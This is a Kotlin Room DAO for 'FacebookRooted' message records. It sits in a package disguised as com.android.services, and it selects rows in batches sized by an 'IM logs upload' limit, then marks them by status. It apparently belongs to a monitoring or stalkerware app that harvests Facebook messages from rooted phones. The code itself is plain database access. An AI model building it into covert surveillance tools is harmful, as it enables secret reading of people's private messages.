package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.FacebookRooted
import com.android.services.util.AppConstants
import java.util.*

@Dao
interface FacebookRootedDao {
    
    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(facebook: List<FacebookRooted>)

    @Query("Select * from facebook_rooted where status =:status ORDER BY date DESC limit ${AppConstants.imLogsUploadLimit}")
    fun selectAllFacebookMessages(status: Int): List<FacebookRooted>

    @Query("Update facebook_rooted set status=:updated_status where date BETWEEN :startDate AND :endDate")
    fun update(updated_status: Int, startDate: Date, endDate: Date): Int

    @Query("select max(timeStamp) from facebook_rooted")
    fun selectMaxTimeStamp(): Long?
}